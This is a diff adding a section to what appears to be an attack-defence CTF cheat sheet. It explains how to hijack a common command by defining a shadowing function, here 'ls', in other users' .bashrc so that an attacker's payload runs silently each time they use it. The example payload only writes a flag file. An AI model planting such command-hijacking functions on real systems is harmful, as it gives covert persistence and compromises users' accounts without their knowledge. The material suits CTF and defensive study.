@@ -222,3 +222,15 @@ function sudo ()
 }
  
 ~~~
+
+### Malicious binary replacement
+add this function to .bashrc in users' profile. If they use bash the next time the run the command you specify, it will also execute whatever you want and also run the user's requested command. you have to edit the function name to match a common bin file name, update the cmd to point to the full path of the bin the user is actually requesting, and update the payload that you want to run. This example will run whenever a user runs the 'ls' command.
+
+~~~
+function ls () 
+{ 
+    cmd="/usr/bin/ls"
+    $cmd "${@:1}"
+    echo "flag value you want to write here" > /tmp/flag
+}
+~~~
